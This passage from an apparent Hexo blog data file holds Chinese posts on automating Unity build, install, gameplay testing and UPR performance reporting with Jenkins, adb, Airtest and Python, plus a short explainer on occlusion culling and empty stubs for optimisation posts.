脚本UPR_Get_SessionId.py 进行创建SessionId</p>\n<pre><code>  url = &quot;https://upr.unity.cn/backend/sessions/create&quot;\n  # 其中parameter需要自己上网页里面查看是什么,每个人的项目中都不一样,这个地方不贴这些东西了,必填;\n  # cookies也一样,必填;\n  # headers不填也行.\n  res = requests.post(url=url, data=parameter,\n                          headers=headers_post, cookies=cookies)\n  print(json.loads(res.text)[&quot;SessionId&quot;])\n  # 这样执行完毕之后,即可在 shell 脚本里面拿到这个值</code></pre></li>\n</ul>\n<p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8B.png\" alt=\"性能检测.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E8%B5%84%E6%BA%90%E6%A3%80%E6%B5%8B.png\" alt=\"资源检测.png\"></p>\n<ul>\n<li><p>11:数据二次处理<br>等待Auto_End_Game脚本结束,停止UPR,(可选操作:关闭 app,执行完毕AirtestIDE.app 中的自动玩游戏代码,关闭AirtestIDE.app等).等待 10s 之后,使用 Python 进行二次数据处理,具体到某一函数,资源,发送给具体的开发人员.最后,将数据分析结果发送到企业微信群里面.此时可以根据每个开发人员的情况进行分发处理任务.</p>\n<pre><code> #shell 脚本里面编写\n python3 xxx/GetAndReport.py ${SessionId}\n\n #python文件 GetAndReport.py 中编写\n # headers_get中包含 cookie,请自行查找.\n res = requests.get(\n         &quot;https://upr.unity.cn/backend/summary/&quot; + SessionId, headers=headers_get)\n # 得到结果之后,进行二次处理,比如我这边就只处理了整体数据\n jd = json.loads(res.text)\n data = &quot;\\n性能数据:{&quot; + &quot;ReservedMono峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxReservedMono&quot;]) + &quot;MB,&quot; + &quot;纹理资源峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxTexture&quot;]) + &quot;MB,&quot; + &quot;动画资源峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxAnimationClip&quot;]) + &quot;MB,&quot; + \\\n         &quot;音频资源峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxAudio&quot;]) + &quot;MB,&quot; + \\\n         &quot;网格资源峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxMesh&quot;]) + &quot;MB,&quot; + \\\n         &quot;DrawCall峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxDrawCalls&quot;]) + &quot;次,&quot; + \\\n         &quot;Tris峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxTriangles&quot;]) + &quot;面&quot; + &quot;}&quot;\n\n # 然后上报企业微信里面,这个需要根据企业微信进行定制开发,官网:https://work.weixin.qq.com/ </code></pre></li>\n</ul>\n<p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E6%9C%80%E7%BB%88@%E6%89%80%E6%9C%89%E4%BA%BA.png\" alt=\"最终@所有人.png\"></p>\n<ul>\n<li>12:资源与 AB 包检测,根据官网的 shell 写法,直接在 Jenkins 里面输出即可,处理二次数据与上面方式一样.</li>\n</ul>\n<hr>\n<h1 id=\"代码窥探\"><a href=\"#代码窥探\" class=\"headerlink\" title=\"代码窥探\"></a>代码窥探</h1><p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Auto_Check_All.png\" alt=\"Auto_Check_All.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Auto_End_Game.png\" alt=\"Auto_End_Game.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Get_Sessionid.png\" alt=\"Get_Sessionid.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Report_All.png\" alt=\"Report_All.png\"></p>\n<hr>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><ul>\n<li>1 点击 Jenkins 上面的构建按钮,等待自动发出项目报告.</li>\n</ul>\n<hr>\n<h1 id=\"结束\"><a href=\"#结束\" class=\"headerlink\" title=\"结束\"></a>结束</h1><ul>\n<li>1 最终的流程是:自动化打包–&gt;自动化安装apk–&gt;自动化玩游戏–&gt;自动化输出性能报告.</li>\n<li>2 其中只需要 Python 自动化玩游戏的维护成本即可.</li>\n<li>3 购买UPR企业服务，可以获得更好的性能优化技术支持和更稳定的自动化测试体验。</li>\n<li>4 为项目节省时间,为公司创造价值,为游戏行业奠定 Unity后工业化流程.</li>\n</ul>\n<hr>\n<h1 id=\"广告\"><a href=\"#广告\" class=\"headerlink\" title=\"广告\"></a>广告</h1><ul>\n<li>1 明显效益:可以节省研发人员成本.隐藏效益:嗯<del>~</del>,也可以将很多测试人员干掉,为公司节省财富,不过我不建议老板这么干.</li>\n<li>2 请一定重视这个 &lt;&lt;Unity后工业化流程&gt;&gt; ,搭建成功就可以为一个项目节省大量时间;推广到整个公司,就能为公司带来巨大效益;如果整个游戏行业都有这个流程,那就是一场改革.</li>\n<li>3 本公司招人<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/job.jpg\" alt=\"job.jpg\"></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Unity后工业化流程\"><a href=\"#Unity后工业化流程\" class=\"headerlink\" title=\"Unity后工业化流程\"></a>Unity后工业化流程</h1><ul>\n<li>1 后工业自动化:是创建游戏之后,需要验证这个游戏的整个流程,并且输出性能评测数据,报告给具体的开发人员.形成一个内环开发链,有输入有输出.</li>\n<li>2 第一步:打包自动化(例如:打 apk,ipa,app,exe等).</li>\n<li>3 第二步:安装游戏(中间涉及到 adb 的使用,root 手机等)</li>\n<li>4 第三步:连接 UPR,并启动游戏</li>\n<li>5 第四步:开启自动玩游戏流程.</li>\n<li>6 第五步:分析性能报告输出结果,报告给每一位开发人员.</li>\n<li>7 第六步:资源,AB包的检查自动化,此流程可自成一条线,但也属于 Unity 后工业流程化的一部分.</li>\n</ul>\n<hr>\n<h1 id=\"成本\"><a href=\"#成本\" class=\"headerlink\" title=\"成本\"></a>成本</h1><ul>\n<li>1 开发人员一名;</li>\n<li>2 mac 电脑一台;</li>\n<li>3 Android手机一部,尽量 root,此 root 会减少搭建流程中的很多细节问题;</li>\n<li>4 Jenkins 基本操作,安装并且创建任务,得到可执行结果.(官网:<a href=\"https://www.jenkins.io/\" target=\"_blank\" rel=\"noopener\">https://www.jenkins.io/</a>)</li>\n<li>5 shell 基础(基本学习:<a href=\"https://www.runoob.com/linux/linux-shell.html\" target=\"_blank\" rel=\"noopener\">https://www.runoob.com/linux/linux-shell.html</a> ;  <a href=\"https://www.bilibili.com/video/BV1bg4y1i7Zj\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1bg4y1i7Zj</a>)</li>\n<li>6 Python 基础(B 站上找个全套 Python 看完即可)</li>\n<li>7 Unity 打包(<a href=\"https://docs.unity3d.com/Manual/CommandLineArguments.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/CommandLineArguments.html</a>)</li>\n<li>8 UPR 基础操作(<a href=\"https://upr.unity.cn/instructions\" target=\"_blank\" rel=\"noopener\">https://upr.unity.cn/instructions</a>)</li>\n<li>9 Airtest IDE 软件操作(<a href=\"http://airtest.netease.com/\" target=\"_blank\" rel=\"noopener\">http://airtest.netease.com/</a>)</li>\n<li>10 一定要 shell,Python,Unity,Jenkins,UPR,Airtest,adb 串联起来才可以搭建起来整个流程.</li>\n</ul>\n<hr>\n<h1 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h1><ul>\n<li>1 安装 <a href=\"https://www.jenkins.io/\" target=\"_blank\" rel=\"noopener\">Jenkins</a>,具体的配置请查看教程: <a href=\"https://www.jianshu.com/p/5ad61bb45b32\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/5ad61bb45b32</a></li>\n<li>2 安装 Unity ,官网下载安装即可.</li>\n<li>3 安装 Python ,安装 3.7 版本,如果安装了 Python3.8 也是可以做的.</li>\n<li>4 安装 Airtest IDE ,直接下载即可,本教程中采取的是 AirtestIDE.app的使用,没有使用 Python 环境打造.</li>\n<li>5 下载 UPR mac 版到电脑,放在工作文件夹中.请查看官网<a href=\"https://upr.unity.cn/\" target=\"_blank\" rel=\"noopener\">https://upr.unity.cn/</a> </li>\n</ul>\n<hr>\n<h1 id=\"工业化流程\"><a href=\"#工业化流程\" class=\"headerlink\" title=\"工业化流程\"></a>工业化流程</h1><ul>\n<li><p>1 创建一个 Jenkins 任务,选择自由构建,最终会执行一个脚本.以下代码为 shell 脚本里面的代码,最终会在 Jenkins 里面执行.<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Jenkins%E9%85%8D%E7%BD%AE1.png\" alt=\"Jenkins配置1\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Jenkins%E9%85%8D%E7%BD%AE2.png\" alt=\"Jenkins配置2\"></p>\n</li>\n<li><p>2 在 SVN 上面创建一个文件夹,用来存放当前教程中用到的工具以及代码<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/SVN%E7%9B%AE%E5%BD%95.png\" alt=\"SVN 目录\"></p>\n</li>\n<li><p>3:介绍从 shell 脚本Auto_Check_All.sh 运行到打包GetAndReport.py 的步骤.首先是 Unity 打包策略.也就是第一步,形成打包自动化,真正的 Jenkins 打包界面是需要很多参数形成的,此流程仅仅为了方便,因此做简化.需要注意的是,此打包方式一定是开发模式.(请移步官网 <a href=\"https://docs.unity3d.com/Manual/CommandLineArguments.html\" target=\"_blank\" rel=\"noopener\">https://docs.unity3d.com/Manual/CommandLineArguments.html</a>)</p>\n<pre><code>  # unity 中可以执行命令的文件路径\n  UNITY_PATH=/Applications/Unity/Unity.app/Contents/MacOS/Unity\n  # 项目路径\n  PROJECT_PATH= xxx/xxx/\n  # 打包之前先杀掉所有打开的 Unity 工程\n  killall Unity\n  # 进行打包,这个地方不懂的可以查看https://github.com/xinzhuzi/UnityTools 进行模拟操作\n  ${UNITY_PATH} -quit -projectPath ${PROJECT_PATH} -executeMethod ProjectBuild.BuildForAndroid_DEV  -logFile ${PROJECT_PATH}/build.txt</code></pre></li>\n<li><p>4:统一 adb 工具,将 AirTestIDE 中的 ADB工具 与 UPR MAC版工具中的数据保持一致.我使用的是直接将AirTestIDE中的 adb 覆盖到 UPR 中.AirTestIDE中的 adb路径为:/Applications/AirtestIDE.app/Contents/MacOS/airtest/core/android/static/adb/mac/adb,使用AirTestIDE链接手机,有时候是硬件问题,有时候是软件问题,都可以在官网或者官网群里面解决,里面的网易小姐姐很善良,人又聪明,说话还好听.(一定要连接正常,如有操作错误,请移步官网教程:<a href=\"http://airtest.netease.com/tutorial/Tutorial.html\" target=\"_blank\" rel=\"noopener\">http://airtest.netease.com/tutorial/Tutorial.html</a>)</p>\n</li>\n<li><p>5:我使用的是小米系列,有时候需要亮屏操作,这一步有的要有的不要,自行摘选即可.</p>\n<pre><code>  # 亮屏,xxx是 UPR 的路径\n  cd xxx\n  if [ &quot;$(xxx/platform-tools/adb shell dumpsys power | grep state= | grep -oE &#39;(ON|OFF)&#39;)&quot; == OFF ] ; then\n      echo &quot;Screen is off. Turning on.&quot;\n      ./adb shell input keyevent 26 # wakeup\n      # ./adb shell input keyevent 82 # unlock\n      echo &quot;OK, should be on now.&quot;\n  fi</code></pre></li>\n<li><p>6:覆盖安装apk</p>\n<pre><code>  # adb devices\n  # 卸载这个 app,目前这一步在启动 APP 的时候会产生Android弹框,不推荐使用,如果 root 手机可以避免这一步,或者其他手段可以避免,则执行这一步是最好的\n  # adb uninstall  (apk的唯一标示符)\n  # 覆盖安装这个 app,此 APK 一定是开发者模式的 APK\n  cd UPR路径/platform-tools/\n  ./adb install -r xxx/xxx.apk</code></pre></li>\n<li><p>7 先开启另一个进程,在此进程中进行自动停止 UPR 的检测,所以为什么前面 Jenkins 上面需要时间限制,就是在模拟真实玩家可以玩游戏玩多久,有轻度用户,重度用户之分.具体细则还需要大家慢慢扩展.</p>\n<pre><code>  # 多少毫秒后暂停玩游戏,xxx 表示随意路径\n  open -n &quot;xxx/Auto_End_Game.sh&quot;\n  ############################################\n  # Auto_End_Game内容很简单,只有 3 行\n  sleep ${Runtime} #默认暂停 500s,也就是玩游戏大约有 500s 左右的时间,其他操作请自行扩展,比如自定义截图等\n  cd UPR路径\n  ./UnityPerfProfiler --stop</code></pre></li>\n<li><p>8:自动化玩游戏<br>我采用的策略比较粗暴.打开 Airtest IDE 软件,并一直连接上 Android 手机,编写自动化玩游戏的代码,编写代码需要根据游戏自行编写,因为在脚本里面提前启动此 app,所有我在自动化玩游戏里面先休眠了 30s,等待游戏开启.此软件在之后的正式流程下会一直连接在手机上面,并且一直开着.<br>自动化流程脚本里面编写:</p>\n<pre><code>  # 开始自动化玩游戏,将AirtestIDE设置为焦点,5 秒之后模拟按下 F5,启动自动化玩游戏\n  # 首先暂停 2s,防止前面代码与下面代码带来冲突\n  sleep 2s\n  # 将打开的AirtestIDE.app 变为焦点app,也就是屏幕最前方的一个 app\n  open -a &quot;/Applications/AirtestIDE.app&quot;\n  # 暂停 5s ,避免冲突\n  sleep 5s\n  # 模拟按下 F5,启动自动化玩游戏\n  function prompt() {\n    osascript &amp;lt;&amp;lt;EOT\n      tell application &quot;System Events&quot;\n        key code 96\n      end tell\n  EOT\n  }\n  value=&quot;$(prompt)&quot;</code></pre></li>\n<li><p>9:启动连接到 UPR 服务,此时会UPR自动启动游戏.</p>\n<pre><code>  # Adb 启动游戏,目前不适用\n  # ./adb shell am start -n com.xlcw.twgame.cn/com.unity3d.player.UnityPlayerActivity\n\n  # 启动 UPR,这个线程到最后都会卡住,SessionId 表示在 UPP 官网上面创建的测试 id\n  首先获取SessionId,使用 Python 脚本获取\n  SessionId=`python3 xxx/UPR_Get_SessionId.py`\n  echo $SessionId\n  # 这个地方具体请看官网的操作\n  cd UPR路径\n  ./UnityPerfProfiler -p ip地址 -s ${SessionId}  -n com.xlcw.twgame.cn    </code></pre></li>\n<li><p>10:python 脚本UPR_Get_SessionId.py 进行创建SessionId</p>\n<pre><code>  url = &quot;https://upr.unity.cn/backend/sessions/create&quot;\n  # 其中parameter需要自己上网页里面查看是什么,每个人的项目中都不一样,这个地方不贴这些东西了,必填;\n  # cookies也一样,必填;\n  # headers不填也行.\n  res = requests.post(url=url, data=parameter,\n                          headers=headers_post, cookies=cookies)\n  print(json.loads(res.text)[&quot;SessionId&quot;])\n  # 这样执行完毕之后,即可在 shell 脚本里面拿到这个值</code></pre></li>\n</ul>\n<p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8B.png\" alt=\"性能检测.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E8%B5%84%E6%BA%90%E6%A3%80%E6%B5%8B.png\" alt=\"资源检测.png\"></p>\n<ul>\n<li><p>11:数据二次处理<br>等待Auto_End_Game脚本结束,停止UPR,(可选操作:关闭 app,执行完毕AirtestIDE.app 中的自动玩游戏代码,关闭AirtestIDE.app等).等待 10s 之后,使用 Python 进行二次数据处理,具体到某一函数,资源,发送给具体的开发人员.最后,将数据分析结果发送到企业微信群里面.此时可以根据每个开发人员的情况进行分发处理任务.</p>\n<pre><code> #shell 脚本里面编写\n python3 xxx/GetAndReport.py ${SessionId}\n\n #python文件 GetAndReport.py 中编写\n # headers_get中包含 cookie,请自行查找.\n res = requests.get(\n         &quot;https://upr.unity.cn/backend/summary/&quot; + SessionId, headers=headers_get)\n # 得到结果之后,进行二次处理,比如我这边就只处理了整体数据\n jd = json.loads(res.text)\n data = &quot;\\n性能数据:{&quot; + &quot;ReservedMono峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxReservedMono&quot;]) + &quot;MB,&quot; + &quot;纹理资源峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxTexture&quot;]) + &quot;MB,&quot; + &quot;动画资源峰值:&quot; + \\\n         str(jd[&quot;summary&quot;][&quot;maxAnimationClip&quot;]) + &quot;MB,&quot; + \\\n         &quot;音频资源峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxAudio&quot;]) + &quot;MB,&quot; + \\\n         &quot;网格资源峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxMesh&quot;]) + &quot;MB,&quot; + \\\n         &quot;DrawCall峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxDrawCalls&quot;]) + &quot;次,&quot; + \\\n         &quot;Tris峰值:&quot; + str(jd[&quot;summary&quot;][&quot;maxTriangles&quot;]) + &quot;面&quot; + &quot;}&quot;\n\n # 然后上报企业微信里面,这个需要根据企业微信进行定制开发,官网:https://work.weixin.qq.com/ </code></pre></li>\n</ul>\n<p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/%E6%9C%80%E7%BB%88@%E6%89%80%E6%9C%89%E4%BA%BA.png\" alt=\"最终@所有人.png\"></p>\n<ul>\n<li>12:资源与 AB 包检测,根据官网的 shell 写法,直接在 Jenkins 里面输出即可,处理二次数据与上面方式一样.</li>\n</ul>\n<hr>\n<h1 id=\"代码窥探\"><a href=\"#代码窥探\" class=\"headerlink\" title=\"代码窥探\"></a>代码窥探</h1><p><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Auto_Check_All.png\" alt=\"Auto_Check_All.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Auto_End_Game.png\" alt=\"Auto_End_Game.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Get_Sessionid.png\" alt=\"Get_Sessionid.png\"><br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/Report_All.png\" alt=\"Report_All.png\"></p>\n<hr>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><ul>\n<li>1 点击 Jenkins 上面的构建按钮,等待自动发出项目报告.</li>\n</ul>\n<hr>\n<h1 id=\"结束\"><a href=\"#结束\" class=\"headerlink\" title=\"结束\"></a>结束</h1><ul>\n<li>1 最终的流程是:自动化打包–&gt;自动化安装apk–&gt;自动化玩游戏–&gt;自动化输出性能报告.</li>\n<li>2 其中只需要 Python 自动化玩游戏的维护成本即可.</li>\n<li>3 购买UPR企业服务，可以获得更好的性能优化技术支持和更稳定的自动化测试体验。</li>\n<li>4 为项目节省时间,为公司创造价值,为游戏行业奠定 Unity后工业化流程.</li>\n</ul>\n<hr>\n<h1 id=\"广告\"><a href=\"#广告\" class=\"headerlink\" title=\"广告\"></a>广告</h1><ul>\n<li>1 明显效益:可以节省研发人员成本.隐藏效益:嗯<del>~</del>,也可以将很多测试人员干掉,为公司节省财富,不过我不建议老板这么干.</li>\n<li>2 请一定重视这个 &lt;&lt;Unity后工业化流程&gt;&gt; ,搭建成功就可以为一个项目节省大量时间;推广到整个公司,就能为公司带来巨大效益;如果整个游戏行业都有这个流程,那就是一场改革.</li>\n<li>3 本公司招人<br><img src=\"/2020/06/20/Unity/IndustrialAutomation/Unity%E5%90%8E%E5%B7%A5%E4%B8%9A%E5%8C%96%E6%B5%81%E7%A8%8B/job.jpg\" alt=\"job.jpg\"></li>\n</ul>\n"},{"_content":"# Occlusion Culling\n\n## 介绍\n\n* 1:[官方文档](https://connect.unity.com/doc/Manual/OcclusionCulling)\n* 2:当对象被其他对象阻挡（遮挡）而不能被摄像机所看到时，遮挡剔除 (Occlusion Culling) 功能会禁用对象的渲染.这种情况不会自动发生在 3D 计算机图形中，因为在大多数时间，距离摄像机最远的对象都是先绘制的，而较近的对象则在先前对象的基础上绘制（这称为“过度绘制 (Overdraw)”）,遮挡剔除与视锥体剔除 (Frustum Culling) 不同。视锥体剔除仅禁用摄像机视野之外的对象的渲染器，而不会禁用由过度绘制隐藏起来的任何对象的渲染器。请注意，使用遮挡剔除时，仍然会受益于视锥体剔除。\n* 3:工作原理:遮挡剔除过程将使用虚拟摄像机在场景中移动，进而构建潜在可见对象集的层级视图。每个摄像机在运行时都会使用此数据来识别可见和不可见的对象。凭借此信息，Unity 将确保只发送可见对象进行渲染。这样可减少绘制调用次数并提高游戏性能,遮挡剔除的数据由单元格组成。每个单元格是从整个场景包围体上细分而来。具体地来说，这些单元格形成一个二叉树。遮挡剔除使用两个树，一个用于视图单元格（静态对象），另一个用于目标单元格（移动对象）。视图单元格映射到一个定义可见静态对象的索引列表，从而为静态对象提供更准确的剔除结果。\n* 4:何时应使用 Occludee Static？不会产生遮挡的完全透明或半透明对象，以及不太可能遮挡其他对象的小型对象应标记为被遮挡物 (Occludee) 而不是遮挡物 (Occluder)。这意味着，它们将被其他对象遮挡，但本身不会被视为遮挡物，这样将有助于减少计算。","source":"_posts/Unity/OcclusionCulling/Occlusion Culling.md","raw":"# Occlusion Culling\n\n## 介绍\n\n* 1:[官方文档](https://connect.unity.com/doc/Manual/OcclusionCulling)\n* 2:当对象被其他对象阻挡（遮挡）而不能被摄像机所看到时，遮挡剔除 (Occlusion Culling) 功能会禁用对象的渲染.这种情况不会自动发生在 3D 计算机图形中，因为在大多数时间，距离摄像机最远的对象都是先绘制的，而较近的对象则在先前对象的基础上绘制（这称为“过度绘制 (Overdraw)”）,遮挡剔除与视锥体剔除 (Frustum Culling) 不同。视锥体剔除仅禁用摄像机视野之外的对象的渲染器，而不会禁用由过度绘制隐藏起来的任何对象的渲染器。请注意，使用遮挡剔除时，仍然会受益于视锥体剔除。\n* 3:工作原理:遮挡剔除过程将使用虚拟摄像机在场景中移动，进而构建潜在可见对象集的层级视图。每个摄像机在运行时都会使用此数据来识别可见和不可见的对象。凭借此信息，Unity 将确保只发送可见对象进行渲染。这样可减少绘制调用次数并提高游戏性能,遮挡剔除的数据由单元格组成。每个单元格是从整个场景包围体上细分而来。具体地来说，这些单元格形成一个二叉树。遮挡剔除使用两个树，一个用于视图单元格（静态对象），另一个用于目标单元格（移动对象）。视图单元格映射到一个定义可见静态对象的索引列表，从而为静态对象提供更准确的剔除结果。\n* 4:何时应使用 Occludee Static？不会产生遮挡的完全透明或半透明对象，以及不太可能遮挡其他对象的小型对象应标记为被遮挡物 (Occludee) 而不是遮挡物 (Occluder)。这意味着，它们将被其他对象遮挡，但本身不会被视为遮挡物，这样将有助于减少计算。","slug":"Unity/OcclusionCulling/Occlusion Culling","published":1,"date":"2020-05-12T02:42:41.567Z","updated":"2020-05-12T02:42:41.568Z","title":"Unity/OcclusionCulling/Occlusion Culling","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d02002v2gk7dpgm559y","content":"<h1 id=\"Occlusion-Culling\"><a href=\"#Occlusion-Culling\" class=\"headerlink\" title=\"Occlusion Culling\"></a>Occlusion Culling</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li>1:<a href=\"https://connect.unity.com/doc/Manual/OcclusionCulling\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n<li>2:当对象被其他对象阻挡（遮挡）而不能被摄像机所看到时，遮挡剔除 (Occlusion Culling) 功能会禁用对象的渲染.这种情况不会自动发生在 3D 计算机图形中，因为在大多数时间，距离摄像机最远的对象都是先绘制的，而较近的对象则在先前对象的基础上绘制（这称为“过度绘制 (Overdraw)”）,遮挡剔除与视锥体剔除 (Frustum Culling) 不同。视锥体剔除仅禁用摄像机视野之外的对象的渲染器，而不会禁用由过度绘制隐藏起来的任何对象的渲染器。请注意，使用遮挡剔除时，仍然会受益于视锥体剔除。</li>\n<li>3:工作原理:遮挡剔除过程将使用虚拟摄像机在场景中移动，进而构建潜在可见对象集的层级视图。每个摄像机在运行时都会使用此数据来识别可见和不可见的对象。凭借此信息，Unity 将确保只发送可见对象进行渲染。这样可减少绘制调用次数并提高游戏性能,遮挡剔除的数据由单元格组成。每个单元格是从整个场景包围体上细分而来。具体地来说，这些单元格形成一个二叉树。遮挡剔除使用两个树，一个用于视图单元格（静态对象），另一个用于目标单元格（移动对象）。视图单元格映射到一个定义可见静态对象的索引列表，从而为静态对象提供更准确的剔除结果。</li>\n<li>4:何时应使用 Occludee Static？不会产生遮挡的完全透明或半透明对象，以及不太可能遮挡其他对象的小型对象应标记为被遮挡物 (Occludee) 而不是遮挡物 (Occluder)。这意味着，它们将被其他对象遮挡，但本身不会被视为遮挡物，这样将有助于减少计算。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Occlusion-Culling\"><a href=\"#Occlusion-Culling\" class=\"headerlink\" title=\"Occlusion Culling\"></a>Occlusion Culling</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li>1:<a href=\"https://connect.unity.com/doc/Manual/OcclusionCulling\" target=\"_blank\" rel=\"noopener\">官方文档</a></li>\n<li>2:当对象被其他对象阻挡（遮挡）而不能被摄像机所看到时，遮挡剔除 (Occlusion Culling) 功能会禁用对象的渲染.这种情况不会自动发生在 3D 计算机图形中，因为在大多数时间，距离摄像机最远的对象都是先绘制的，而较近的对象则在先前对象的基础上绘制（这称为“过度绘制 (Overdraw)”）,遮挡剔除与视锥体剔除 (Frustum Culling) 不同。视锥体剔除仅禁用摄像机视野之外的对象的渲染器，而不会禁用由过度绘制隐藏起来的任何对象的渲染器。请注意，使用遮挡剔除时，仍然会受益于视锥体剔除。</li>\n<li>3:工作原理:遮挡剔除过程将使用虚拟摄像机在场景中移动，进而构建潜在可见对象集的层级视图。每个摄像机在运行时都会使用此数据来识别可见和不可见的对象。凭借此信息，Unity 将确保只发送可见对象进行渲染。这样可减少绘制调用次数并提高游戏性能,遮挡剔除的数据由单元格组成。每个单元格是从整个场景包围体上细分而来。具体地来说，这些单元格形成一个二叉树。遮挡剔除使用两个树，一个用于视图单元格（静态对象），另一个用于目标单元格（移动对象）。视图单元格映射到一个定义可见静态对象的索引列表，从而为静态对象提供更准确的剔除结果。</li>\n<li>4:何时应使用 Occludee Static？不会产生遮挡的完全透明或半透明对象，以及不太可能遮挡其他对象的小型对象应标记为被遮挡物 (Occludee) 而不是遮挡物 (Occluder)。这意味着，它们将被其他对象遮挡，但本身不会被视为遮挡物，这样将有助于减少计算。</li>\n</ul>\n"},{"title":"Unity AndroidStudio工具检测优化","date":"2020-05-08T03:41:32.000Z","top":6,"_content":"","source":"_posts/Unity/Optimize/AndroidStudio.md","raw":"---\ntitle: Unity AndroidStudio工具检测优化\ndate: 2020-05-08 11:41:32\ntop: 6\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---","slug":"Unity/Optimize/AndroidStudio","published":1,"updated":"2020-06-15T07:12:13.992Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d04002z2gk7atkihxf2","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Unity CPU优化","date":"2020-05-08T03:41:32.000Z","top":7,"_content":"","source":"_posts/Unity/Optimize/CPU优化.md","raw":"---\ntitle: Unity CPU优化\ndate: 2020-05-08 11:41:32\ntop: 7\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---","slug":"Unity/Optimize/CPU优化","published":1,"updated":"2020-06-15T07:13:49.456Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0400322gk7fstm585e","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Unity GPU优化","date":"2020-05-08T03:41:32.000Z","top":7,"_content":"","source":"_posts/Unity/Optimize/GPU优化.md","raw":"---\ntitle: Unity GPU优化\ndate: 2020-05-08 11:41:32\ntop: 7\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---","slug":"Unity/Optimize/GPU优化","published":1,"updated":"2020-06-15T07:12:30.194Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0600362gk70de72vky","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"Unity 优化总纲","date":"2020-05-08T03:41:32.000Z","top":1,"_content":"\n\n# 编程代码规范\n\n* 1:脚本行数最多500行。\n* 